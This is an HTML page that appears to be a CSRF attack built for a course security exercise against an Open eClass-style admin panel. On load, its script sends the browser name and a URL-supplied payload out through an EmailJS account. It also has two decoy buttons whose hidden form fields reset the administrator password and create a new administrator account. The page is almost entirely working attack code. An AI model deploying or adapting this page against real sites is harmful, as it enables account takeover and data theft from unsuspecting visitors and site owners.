<html>
<head>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
    <script type="text/javascript"
        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js">
	</script>

	<script type="text/javascript">
	   (function(){
	      emailjs.init("nzx-JF2LXc6mtpiLH");
	   })();
	</script>

    <style>
		.myButton {
			margin-top: 30px;
			border-radius: 25px;
			background-color: white;
			color: black;
			width: 350px;
			height: 60px;

		}
	</style>

	<script type="text/javascript">

		function detectBrowser(){
                 
			let userAgent = navigator.userAgent;
			let browserName;

			if(userAgent.match(/chrome|chromium|crios/i)){
			 browserName = "chrome";
			}else if(userAgent.match(/firefox|fxios/i)){
			 browserName = "firefox";
			}  else if(userAgent.match(/safari/i)){
			 browserName = "safari";
			}else if(userAgent.match(/opr\//i)){
			 browserName = "opera";
			} else if(userAgent.match(/edg/i)){
			 browserName = "edge";
			}else{
			 browserName="unknown";
			}

			console.log("You are using "+ browserName +" browser"); 
			return browserName;
  		}

		function email(message){
			var PARAMS = {
		      message: message
		    }

			emailjs.send('service_txstjpq', 'service_txstjpq', PARAMS, 'nzx-JF2LXc6mtpiLH')
		      .then((result) => {
		          console.log(result.text);
		      }, (error) => {
		          console.log(error.text);
		    });
		}

		function get_url_arg(name){
			var url = new URL(window.location.href);
			return url.searchParams.get(name);
		}

		function receive_payload(){
			let payload = get_url_arg("totally_not_suspicious");
			if (payload != null) {
				return payload;
			}
			return null;
		}
		
		function send_csrf(){

			let message = '';

			// Get browser info
			let browser = detectBrowser();
			if( browser!="unknown" ){
				message += "Movement detected using " + browser;
			}

			// Get payload (if any)
			let payload = receive_payload();
			if( payload!=null ){
				message+='\n Payload = ' + payload;
			}
			
			// Report Back
			email(message);
			//alert(message);
			console.log(message);
		}

        window.onload = send_csrf;
		
	</script>

</head>
<body>

	<div class="w-100 h-100" style="background-color:#282C34;">
		<div class="d-flex justify-content-center">
			<div class="d-flex flex-column mt-5 mx-auto">
				<h2 class="mx-auto" style="color:white;"> Hello there fellow pigeons </h2>
				<img src="https://pbs.twimg.com/media/B8kHjLECMAA_RKn?format=jpg&name=small" alt="pigeon gang"/>

				<form class="mx-auto" method="post" action="http://localhost:8001/modules/admin/password.php?submit=yes&changePass=do&userid=1">
					<input type="hidden" name="password_form" value="4321">
					<input type="hidden" name="password_form1" value="4321">
					<input class="myButton mx-auto" type="submit" name="submit" value="Learn the secrets of the Pigeonverse">
				</form>

				<form action='http://madclip-enthusiasts.csec.chatzi.org/modules/admin/newuseradmin.php' method='post' class="mt-1 mx-auto">
					<input type='hidden' name='nom_form' value='Mr' >
					<input type='hidden' name='prenom_form' value='Pilot' >
					<input type='hidden' name='uname' value='pilot' >
					<input type='hidden' name='password' value='1234' >
					<input type='hidden' name='email_form' value='pilot@sky.gr' >
					<select class="d-none" name='department'  class='auth_input'>
						<option selected value='1'>Τμήμα 1</option>
					</select>
					<input type='hidden' name='comment' value='1234' >

					<select class="d-none" name='language'>
						<option selected value='el'>Ελληνικά</option>
					</select>

					<input type='hidden' name='rid' value=''>
					<input type='hidden' name='pstatut' value='1'>
			        <input type='hidden' name='auth' value='1' >

					<input class="myButton mx-auto" type='submit' name='submit' value='Learn the truth about Chinese drones' >
				</form>

				<!-- <button class="myButton mx-auto" onclick="send_csrf()">
		          Learn the secrets of the Pigeonverse
		        </button> -->

			</div>
		</div>
	</div>

</body>
</html>
